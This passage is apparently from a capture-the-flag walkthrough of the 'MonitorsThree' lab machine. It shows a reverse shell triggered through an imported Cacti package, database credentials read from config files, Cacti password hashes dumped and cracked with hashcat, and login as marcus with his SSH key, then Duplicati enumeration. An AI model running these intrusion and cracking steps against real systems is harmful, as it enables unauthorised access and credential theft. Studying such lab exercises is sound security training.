+&lt;signature&gt;c/PPGYnjmqs0bD1VNumaDZ11CudS8xbnzzBswFUH3a5hBppjHu45inbgj0aKw03L8qbYISZtJW8OCQNJfhk4UUTUj01j5d41R7PvABPw9rd1QJp69h/u8ttI9JPK5bUDgSnU+4fUNyy1kU9o9GmSB1rbzwrIc4xKeZPVJ2Mbp26J/ozft8ABYLyKfovef3WcSbI2vija78Rj5NyQ9LpxAhcOLeSE5nBCew/AyDEOzxJLvsS3ysrCkirTjXVIrzqbCN8VZPOoUSms6qMU7Olg3mB2/6aQBLBISxsbCRwRu79J2CWP53zsaUfMxiP7H+Ya70paCk+mNg18E5a0YanuZw==&lt;/signature&gt;
+&lt;/xml&gt;
+</span></code></pre></div></div>
+<p>In Cacti, on the menu on the left, there’s an option for “Import/Export” –&gt; “Import Packages”:</p>
+<picture>
+<source srcset="/img/image-20240828090732624.webp" type="image/webp"/>
+<img alt="image-20240828090732624" class="include_image" loading="lazy" src="/img/image-20240828090732624.png"/>
+</picture>
+<p>I’ll select <code class="language-plaintext highlighter-rouge">revshell.xml.gz</code>, and click Import:</p>
+<picture>
+<source srcset="/img/image-20240828090802458.webp" type="image/webp"/>
+<img alt="image-20240828090802458" class="include_image" loading="lazy" src="/img/image-20240828090802458.png"/>
+</picture>
+<p>Now if I visit <code class="language-plaintext highlighter-rouge">http://cacti.monitorsthree.htb/cacti/resource/0xdf.php</code>, it triggers the reverse shell, and I get a connection at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.30 56440
+bash: cannot set terminal process group (1141): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@monitorsthree:~/html/cacti/resource$</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll do the standard <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">shell upgrade</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@monitorsthree:~/html/cacti/resource$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+</span><span class="gp">www-data@monitorsthree:~/html/cacti/resource$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+</span><span class="gp">            ‍</span>reset
+<span class="go">reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">www-data@monitorsthree:~/html/cacti/resource$</span><span class="w"> 
+</span></code></pre></div></div>
+<h2 id="shell-as-marcus">Shell as marcus</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="users">Users</h4>
+<p>There is one user on the box with a home directory in <code class="language-plaintext highlighter-rouge">/home</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@monitorsthree:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">marcus
+</span></code></pre></div></div>
+<p>www-data cannot access marcus’ home directory. Only marcus and root are configured with shells:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@monitorsthree:~$</span><span class="w"> </span><span class="nb">grep</span> <span class="s2">"sh$"</span> /etc/passwd
+<span class="go">root:x:0:0:root:/root:/bin/bash
+marcus:x:1000:1000:Marcus:/home/marcus:/bin/bash
+</span></code></pre></div></div>
+<h4 id="opt">opt</h4>
+<p>There are a few interesting folders in <code class="language-plaintext highlighter-rouge">/opt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@monitorsthree:/opt$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">backups  containerd  docker-compose.yml  duplicati
+</span></code></pre></div></div>
+<p>These are interesting, but I’ll come back to them later (though there’s actually nothing stopping me from using <a href="https://github.com/jpillora/chisel">Chisel</a> to tunnel now and going directly to root).</p>
+<h4 id="main-site-1">Main Site</h4>
+<p>There are two directories in <code class="language-plaintext highlighter-rouge">/var/www/html</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@monitorsthree:~/html$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">app  cacti  index.php
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">index.php</code> file is just a PHP redirect to <code class="language-plaintext highlighter-rouge">/cacti</code>.</p>
+<p>The <code class="language-plaintext highlighter-rouge">app</code> directory has the main site:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@monitorsthree:~/html/app$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">admin  css  fonts  forgot_password.php  images  index.php  js  login.php
+</span></code></pre></div></div>
+<p>In <code class="language-plaintext highlighter-rouge">admin/db.php</code>, it does the DB connection:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="nv">$dsn</span> <span class="o">=</span> <span class="s1">'mysql:host=127.0.0.1;port=3306;dbname=monitorsthree_db'</span><span class="p">;</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="s1">'app_user'</span><span class="p">;</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="s1">'php_app_password'</span><span class="p">;</span>
+<span class="nv">$options</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="no">PDO</span><span class="o">::</span><span class="no">ATTR_ERRMODE</span> <span class="o">=&gt;</span> <span class="no">PDO</span><span class="o">::</span><span class="no">ERRMODE_EXCEPTION</span><span class="p">,</span>
+    <span class="no">PDO</span><span class="o">::</span><span class="no">ATTR_DEFAULT_FETCH_MODE</span> <span class="o">=&gt;</span> <span class="no">PDO</span><span class="o">::</span><span class="no">FETCH_ASSOC</span><span class="p">,</span>
+<span class="p">];</span>
+
+<span class="k">try</span> <span class="p">{</span>
+    <span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PDO</span><span class="p">(</span><span class="nv">$dsn</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$options</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nc">PDOException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s1">'Connection failed: '</span> <span class="mf">.</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>I’ll note the username and password. There’s not much else of interest on this site.</p>
+<h4 id="cacti">Cacti</h4>
+<p>The <code class="language-plaintext highlighter-rouge">cacti</code> folder has a ton of pages, but that’s typical for this application, matching what’s on <a href="https://github.com/Cacti/cacti">GitHub</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@monitorsthree:~/html/cacti$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">CHANGELOG                   automation_tree_rules.php  data_debug.php            graph_templates_inputs.php  lib                    poller_boost.php        rra                          templates_import.php
+LICENSE                     boost_rrdupdate.php        data_input.php            graph_templates_items.php   link.php               poller_commands.php     rrdcheck.php                 tests
+README.md                   cache                      data_queries.php          graph_view.php              links.php              poller_dsstats.php      rrdcleaner.php               tree.php
+about.php                   cacti.sql                  data_source_profiles.php  graph_xport.php             locales                poller_maintenance.php  script_server.php            user_admin.php
+aggregate_graphs.php        cactid.php                 data_sources.php          graphs.php                  log                    poller_realtime.php     scripts                      user_domains.php
+aggregate_templates.php     cdef.php                   data_templates.php        graphs_items.php            logout.php             poller_recovery.php     service                      user_group_admin.php
+auth_changepassword.php     cli                        docs                      graphs_new.php              managers.php           poller_reports.php      service_check.php            utilities.php
+auth_login.php              clog.php                   formats                   help.php                    mibs                   poller_rrdcheck.php     settings.php                 vdef.php
+auth_profile.php            clog_user.php              gprint_presets.php        host.php                    package_import.php     poller_spikekill.php    sites.php
+automation_devices.php      cmd.php                    graph.php                 host_templates.php          permission_denied.php  pollers.php             snmpagent_mibcache.php
+automation_graph_rules.php  cmd_realtime.php           graph_image.php           images                      plugins                remote_agent.php        snmpagent_mibcachechild.php
+automation_networks.php     color.php                  graph_json.php            include                     plugins.php            reports_admin.php       snmpagent_persist.php
+automation_snmp.php         color_templates.php        graph_realtime.php        index.php                   poller.php             reports_user.php        spikekill.php
+automation_templates.php    color_templates_items.php  graph_templates.php       install                     poller_automation.php  resource                templates_export.php
+</span></code></pre></div></div>
+<p>The DB connection information is in <code class="language-plaintext highlighter-rouge">include/config.php</code>, which is very long with lots of comments, but includes this section near the top:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$database_type</span>     <span class="o">=</span> <span class="s1">'mysql'</span><span class="p">;</span>                              
+<span class="nv">$database_default</span>  <span class="o">=</span> <span class="s1">'cacti'</span><span class="p">;</span>                              
+<span class="nv">$database_hostname</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>                          
+<span class="nv">$database_username</span> <span class="o">=</span> <span class="s1">'cactiuser'</span><span class="p">;</span>                          
+<span class="nv">$database_password</span> <span class="o">=</span> <span class="s1">'cactiuser'</span><span class="p">;</span>
+<span class="nv">$database_port</span>     <span class="o">=</span> <span class="s1">'3306'</span><span class="p">;</span>
+<span class="nv">$database_retries</span>  <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>                                 
+<span class="nv">$database_ssl</span>      <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>                                
+<span class="nv">$database_ssl_key</span>  <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>                                   
+<span class="nv">$database_ssl_cert</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$database_ssl_ca</span>   <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>                                   
+<span class="nv">$database_persist</span>  <span class="o">=</span> <span class="kc">false</span><span class="p">;</span> 
+</code></pre></div></div>
+<p>Nothing else here of interest.</p>
+<h4 id="database">Database</h4>
+<p>Each application uses a different user to connect to the database. I already observed from the SQL injection that the app_user can see two databases, which I’ll confirm:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@monitorsthree:~$</span><span class="w"> </span>mysql <span class="nt">-u</span> app_user <span class="nt">-pphp_app_password</span> monitorsthree_db
+<span class="go">...[snip]...
+MariaDB [monitorsthree_db]&gt; show databases; 
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| monitorsthree_db   |
++--------------------+
+2 rows in set (0.001 sec)
+</span></code></pre></div></div>
+<p>I’ll check out the other tables in <code class="language-plaintext highlighter-rouge">monitorsthree_db</code> but there’s nothing interesting.</p>
+<p>cactiuser has access to different databases:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@monitorsthree:~$</span><span class="w"> </span>mysql <span class="nt">-u</span> cactiuser <span class="nt">-pcactiuser</span> cacti                 
+<span class="go">...[snip]...
+</span><span class="gp">MariaDB [cacti]&gt;</span><span class="w"> </span>show databases<span class="p">;</span>
+<span class="go">+--------------------+
+| Database           |
++--------------------+
+| cacti              |
+| information_schema |
+| mysql              |
++--------------------+
+3 rows in set (0.000 sec)
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">cacti</code> has 113 tables:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">MariaDB [cacti]&gt; </span><span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
+<span class="go">+-------------------------------------+
+| Tables_in_cacti                     |
++-------------------------------------+
+| aggregate_graph_templates           |
+| aggregate_graph_templates_graph     |
+| aggregate_graph_templates_item      |
+| aggregate_graphs                    |
+| aggregate_graphs_graph_item         |
+| aggregate_graphs_items              |
+| automation_devices                  |
+| automation_graph_rule_items         |
+| automation_graph_rules              |
+| automation_ips                      |
+| automation_match_rule_items         |
+| automation_networks                 |
+| automation_processes                |
+| automation_snmp                     |
+| automation_snmp_items               |
+| automation_templates                |
+| automation_tree_rule_items          |
+| automation_tree_rules               |
+| cdef                                |
+| cdef_items                          |
+| color_template_items                |
+| color_templates                     |
+| colors                              |
+| data_debug                          |
+| data_input                          |
+| data_input_data                     |
+| data_input_fields                   |
+| data_local                          |
+| data_source_profiles                |
+| data_source_profiles_cf             |
+| data_source_profiles_rra            |
+| data_source_purge_action            |
+| data_source_purge_temp              |
+| data_source_stats_daily             |
+| data_source_stats_hourly            |
+| data_source_stats_hourly_cache      |
+| data_source_stats_hourly_last       |
+| data_source_stats_monthly           |
+| data_source_stats_weekly            |
+| data_source_stats_yearly            |
+| data_template                       |
+| data_template_data                  |
+| data_template_rrd                   |
+| external_links                      |
+| graph_local                         |
+| graph_template_input                |
+| graph_template_input_defs           |
+| graph_templates                     |
+| graph_templates_gprint              |
+| graph_templates_graph               |
+| graph_templates_item                |
+| graph_tree                          |
+| graph_tree_items                    |
+| host                                |
+| host_graph                          |
+| host_snmp_cache                     |
+| host_snmp_query                     |
+| host_template                       |
+| host_template_graph                 |
+| host_template_snmp_query            |
+| plugin_config                       |
+| plugin_db_changes                   |
+| plugin_hooks                        |
+| plugin_realms                       |
+| poller                              |
+| poller_command                      |
+| poller_data_template_field_mappings |
+| poller_item                         |
+| poller_output                       |
+| poller_output_boost                 |
+| poller_output_boost_local_data_ids  |
+| poller_output_boost_processes       |
+| poller_output_realtime              |
+| poller_reindex                      |
+| poller_resource_cache               |
+| poller_time                         |
+| processes                           |
+| reports                             |
+| reports_items                       |
+| rrdcheck                            |
+| sessions                            |
+| settings                            |
+| settings_tree                       |
+| settings_user                       |
+| settings_user_group                 |
+| sites                               |
+| snmp_query                          |
+| snmp_query_graph                    |
+| snmp_query_graph_rrd                |
+| snmp_query_graph_rrd_sv             |
+| snmp_query_graph_sv                 |
+| snmpagent_cache                     |
+| snmpagent_cache_notifications       |
+| snmpagent_cache_textual_conventions |
+| snmpagent_managers                  |
+| snmpagent_managers_notifications    |
+| snmpagent_mibs                      |
+| snmpagent_notifications_log         |
+| user_auth                           |
+| user_auth_cache                     |
+| user_auth_group                     |
+| user_auth_group_members             |
+| user_auth_group_perms               |
+| user_auth_group_realm               |
+| user_auth_perms                     |
+| user_auth_realm                     |
+| user_auth_row_cache                 |
+| user_domains                        |
+| user_domains_ldap                   |
+| user_log                            |
+| vdef                                |
+| vdef_items                          |
+| version                             |
++-------------------------------------+
+113 rows in set (0.001 sec)
+</span></code></pre></div></div>
+<p>Most of it has to do with the devices and management of them in Cacti, but <code class="language-plaintext highlighter-rouge">user_auth</code> jumps out as interesting:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">MariaDB [cacti]&gt; </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">user_auth</span><span class="p">;</span>
+<span class="go">+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
+| id | username | password                                                     | realm | full_name     | email_address            | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
++----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
+|  1 | admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |     0 | Administrator | marcus@monitorsthree.htb |                      |                 | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   436423766 |
+|  3 | guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |     0 | Guest Account | guest@monitorsthree.htb  |                      |                 | on        | on        | on           |                |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |  3774379591 |
+|  4 | marcus   | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK |     0 | Marcus        | marcus@monitorsthree.htb |                      | on              | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  |        |               0 |        0 |  1677427318 |
++----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
+3 rows in set (0.001 sec)
+</span></code></pre></div></div>
+<p>There’s three users, including the admin user whose password I already know.</p>
+<h3 id="shell-1">Shell</h3>
+<h4 id="crack-password-1">Crack Password</h4>
+<p>The hashes look like bcrypt passwords, though I know that <code class="language-plaintext highlighter-rouge">hashcat</code> isn’t going to be able to automatically recognize. As I know the admin’s password already, I can use Python to check the password and the hash:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span><span class="n">python</span>
+<span class="go">Python 3.12.3 (main, Jul 31 2024, 17:43:48) [GCC 13.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="n">bcrypt</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">bcrypt</span><span class="p">.</span><span class="nf">checkpw</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">greencacti2001</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">$2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G</span><span class="sh">"</span><span class="p">)</span>
+<span class="go">True
+</span></code></pre></div></div>
+<p>It works. I’ll use <code class="language-plaintext highlighter-rouge">hashcat</code> to try the other two:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$ </span><span class="nb">cat </span>cacti_hashes 
+<span class="go">guest:$2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu
+marcus:$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK
+</span><span class="gp">$ </span>hashcat cacti_hashes <span class="nt">-m3200</span> <span class="nt">--user</span> /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
+<span class="go">hashcat (v6.2.6) starting
+...[snip]...
+$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
+...[snip]...
+</span></code></pre></div></div>
+<p>The marcus one cracks right away as “12345678910”.</p>
+<h4 id="su">su</h4>
+<p>That password works for marcus with <code class="language-plaintext highlighter-rouge">su</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@monitorsthree:~$</span><span class="w"> </span>su - marcus
+<span class="go">Password: 
+</span><span class="gp">marcus@monitorsthree:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>And I can read <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">marcus@monitorsthree:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">1bdeb325************************
+</span></code></pre></div></div>
+<h4 id="ssh">SSH</h4>
+<p>I’m not able to SSH as marcus, as password authentication is disabled for all users:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">marcus@monitorsthree:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/ssh/sshd_config | <span class="nb">grep</span> ^PasswordAuthentication
+<span class="go">PasswordAuthentication no
+</span></code></pre></div></div>
+<p>There is a key pair in <code class="language-plaintext highlighter-rouge">.ssh</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">marcus@monitorsthree:~/.ssh$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">authorized_keys  id_rsa  id_rsa.pub
+</span></code></pre></div></div>
+<p>And it works to log in with a more stable shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/monitorsthree-marcus marcus@monitorsthree.htb
+<span class="go">Last login: Wed Aug 28 03:00:54 2024 from 10.10.14.6
+</span><span class="gp">marcus@monitorsthree:~$</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<h4 id="filesystem">Filesystem</h4>
+<p>There’s nothing else too interesting in marcus’ home directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">marcus@monitorsthree:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 32
+drwxr-x--- 4 marcus marcus 4096 Aug 16 11:35 .
+drwxr-xr-x 3 root   root   4096 May 26 16:34 ..
+lrwxrwxrwx 1 root   root      9 Aug 16 11:29 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 marcus marcus  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 marcus marcus 3771 Jan  6  2022 .bashrc
+drwx------ 2 marcus marcus 4096 Aug 16 11:35 .cache
+-rw-r--r-- 1 marcus marcus  807 Jan  6  2022 .profile
+drwx------ 2 marcus marcus 4096 Aug 28 14:14 .ssh
+-rw-r----- 1 root   marcus   33 May 26 18:11 user.txt
+</span></code></pre></div></div>
+<p>There aren’t interesting files owned by marcus either:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">marcus@monitorsthree:~$</span><span class="w"> </span>find / <span class="nt">-user</span> marcus 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-vP</span> <span class="s2">"^/(home|sys|proc|run)"</span>
+<span class="go">/dev/pts/1
+</span><span class="gp">marcus@monitorsthree:~$</span><span class="w"> </span>find / <span class="nt">-group</span> marcus 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-vP</span> <span class="s2">"^/(home|sys|proc|run)"</span>
+<span class="gp">marcus@monitorsthree:~$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
+</span></code></pre></div></div>
+<p>marcus doesn’t have any other interesting groups, and can’t run anything with <code class="language-plaintext highlighter-rouge">sudo</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">marcus@monitorsthree:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">[sudo] password for marcus: 
+Sorry, user marcus may not run sudo on monitorsthree.
+</span></code></pre></div></div>
+<h4 id="processes">Processes</h4>
+<p>marcus is only able to see processes running as marcus:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">marcus@monitorsthree:~$</span><span class="w"> </span>ps auxww
+<span class="go">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+marcus      2667  0.0  0.2  17120  9592 ?        Ss   14:22   0:00 /lib/systemd/systemd --user
+marcus      2675  0.0  0.1   8800  5556 pts/0    S+   14:22   0:00 -bash
+marcus      2692  0.0  0.1   8812  5588 pts/1    Ss   14:22   0:00 -bash
+marcus      3080  0.0  0.0  10072  1612 pts/1    R+   14:37   0:00 ps auxww
+</span></code></pre></div></div>
+<p>That’s because the <code class="language-plaintext highlighter-rouge">/proc</code> filesystem is mounted with <code class="language-plaintext highlighter-rouge">hidepid</code> of 2 / <code class="language-plaintext highlighter-rouge">invisible</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">marcus@monitorsthree:~$</span><span class="w"> </span>mount | <span class="nb">grep</span> ^proc
+<span class="go">proc on /proc type proc (rw,relatime,hidepid=invisible)
+</span></code></pre></div></div>
+<h4 id="network">Network</h4>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> scans showed that 8084 was filtered. In <code class="language-plaintext highlighter-rouge">/etc/iptables/rules.v4</code>, there are lines that show this block, but allow it from localhost:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-A</span> INPUT <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 8084 <span class="nt">-j</span> DROP                
+<span class="nt">-A</span> INPUT <span class="nt">-s</span> 127.0.0.1/32 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 8084 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 8084 <span class="nt">-j</span> DROP                
+<span class="nt">-A</span> INPUT <span class="nt">-s</span> 127.0.0.1/32 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 8084 <span class="nt">-j</span> ACCEPT 
+</code></pre></div></div>
+<p>Besides 8084, there are four other services listening on localhost only:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">marcus@monitorsthree:~$</span><span class="w"> </span>ss <span class="nt">-tnlp</span>
+<span class="go">State       Recv-Q      Send-Q           Local Address:Port            Peer Address:Port     Process      
+LISTEN      0           4096                 127.0.0.1:8200                 0.0.0.0:*                     
+LISTEN      0           511                    0.0.0.0:80                   0.0.0.0:*                     
+LISTEN      0           128                    0.0.0.0:22                   0.0.0.0:*                     
+LISTEN      0           500                    0.0.0.0:8084                 0.0.0.0:*                     
+LISTEN      0           4096                 127.0.0.1:36483                0.0.0.0:*                     
+LISTEN      0           4096             127.0.0.53%lo:53                   0.0.0.0:*                     
+LISTEN      0           70                   127.0.0.1:3306                 0.0.0.0:*                     
+LISTEN      0           511                       [::]:80                      [::]:*                     
+LISTEN      0           128                       [::]:22                      [::]:*
+</span></code></pre></div></div>
+<p>3306 is MySQL which I’ve already enumerated. 53 is DNS. I’ll focus on 8084 and 8200 as low ports. Neither <code class="language-plaintext highlighter-rouge">nc</code> or <code class="language-plaintext highlighter-rouge">curl</code> returned anything on 8084. But 8200 returns a redirect to <code class="language-plaintext highlighter-rouge">/login.html</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">marcus@monitorsthree:~$</span><span class="w"> </span>curl <span class="nt">-v</span> http://localhost:8200
+<span class="go">*   Trying 127.0.0.1:8200...
+* Connected to localhost (127.0.0.1) port 8200 (#0)
+&gt; GET / HTTP/1.1
+&gt; Host: localhost:8200
+&gt; User-Agent: curl/7.81.0
+&gt; Accept: */*
+&gt; 
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 302 Redirect
+&lt; location: /login.html
+&lt; Date: Wed, 28 Aug 2024 14:51:40 GMT
+&lt; Content-Length: 0
+&lt; Content-Type: 
+&lt; Server: Tiny WebServer
+&lt; Connection: close
+&lt; Set-Cookie: xsrf-token=2Ao4fvBJt4w7VDeACGotVuyHKkN0IGkx01Pugvqnt9I%3D; expires=Wed, 28 Aug 2024 15:01:40 GMT;path=/; 
+&lt; 
+* Closing connection 0
+</span></code></pre></div></div>
+<h3 id="duplicati-enumeration">Duplicati Enumeration</h3>
+<h4 id="site-2">Site</h4>
+<p>I’ll use SSH with <code class="language-plaintext highlighter-rouge">-L 8200:localhost:8200</code> to create a tunnel from my host 8200 to this instance on MonitorsThree. Visiting the page offers a login for Duplicati:</p>
+<picture>
+<source srcset="/img/image-20240828110120965.webp" type="image/webp"/>
+<img alt="image-20240828110120965" class="include_image" loading="lazy" src="/img/image-20240828110120965.png"/>
+</picture>
+<p><a href="https://duplicati.com/">Duplicati</a> is a “Zero trust, fully encrypted backup” system. I’ll try a guess password, but it fails:</p>
+<picture>
+<source srcset="/img/image-20240828124634063.webp" type="image/webp"/>
+<img alt="image-20240828124634063" class="include_image" loading="lazy" src="/img/image-20240828124634063.png"/>
+</picture>
+<p>It’s interesting to look at the two POST requests generated on trying to log in, both to <code class="language-plaintext highlighter-rouge">/login.cgi</code>. The first has a body requesting a nonce:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/login.cgi</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8200</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/javascript, */*; q=0.01</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded; charset=UTF-8</span>
+<span class="na">X-Requested-With</span><span class="p">:</span> <span class="s">XMLHttpRequest</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">11</span>
